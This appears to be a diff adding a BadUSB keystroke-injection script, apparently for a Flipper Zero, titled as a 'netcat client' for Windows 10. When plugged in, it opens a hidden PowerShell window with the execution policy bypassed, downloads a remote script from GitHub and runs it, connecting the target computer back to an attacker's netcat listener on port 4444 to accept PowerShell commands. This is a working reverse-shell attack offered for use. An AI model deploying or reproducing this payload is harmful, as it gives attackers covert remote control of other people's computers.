@@ -1,0 +1,20 @@
+
+REM Title: Beigeworm's Simple Netcat Client 
+REM Author: @beigeworm
+REM Description: This script connects target computer with a netcat session to send powershell commands.
+REM Target: Windows 10
+
+REM *SETUP*
+REM replace IP_HERE with your netcat attacker IP Address.
+REM NOTE The PORT number is 4444
+
+REM some setup for dukie script
+DEFAULT_DELAY 100
+
+REM open powershell (remove "-W H" to show the window)
+DELAY 1000
+GUI r
+DELAY 750
+STRING powershell -NoP -Ep Bypass -W H -C $ip='IP_HERE'; irm https://raw.githubusercontent.com/beigeworm/BadUSB-Files-For-FlipperZero/main/Netcat-Client/main.ps1 | iex
+ENTER
+
